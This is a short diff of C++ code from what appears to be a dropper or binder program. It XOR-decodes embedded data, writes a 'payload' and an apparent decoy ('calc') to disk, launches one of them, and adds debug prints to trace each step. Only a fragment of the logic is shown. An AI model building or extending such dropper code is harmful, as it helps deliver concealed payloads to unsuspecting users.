@@ -210,8 +210,11 @@ int main(int argc, char* argv[])
 		data3 = XOR(data3, size3);
 	#endif
 
-		drop(size1, data1, name1);
 		drop(size3, data3, name3);
+		std::cout << "payload ran\n";
+		drop(size1, data1, name1);
+		std::cout << "calc ran\n";
+
 
 		bool result = non_exe_launch(name3);
 
